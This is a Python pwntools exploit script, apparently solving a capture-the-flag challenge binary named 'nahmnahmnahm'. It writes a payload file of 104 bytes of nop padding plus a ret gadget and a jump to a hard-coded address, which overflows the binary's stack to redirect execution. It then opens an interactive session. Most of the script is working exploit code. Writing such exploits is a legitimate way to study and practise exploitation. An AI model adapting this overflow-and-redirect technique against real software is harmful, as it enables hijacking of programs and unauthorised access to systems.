#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template nahmnahmnahm
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./nahmnahmnahm')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
init-peda
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

open('/tmp/exploit', 'w').write('get rekt')

io.sendlineafter(b': ', b'/tmp/exploit')

padding = 104

pop_rdi = 0x00000000004015d3 # pop rdi; ret;

payload = flat([
    asm('nop') * padding,
    pop_rdi+1,
    0x401296
])

open('/tmp/exploit', 'wb').write(payload)

io.sendlineafter(b':\n', b"")

io.interactive()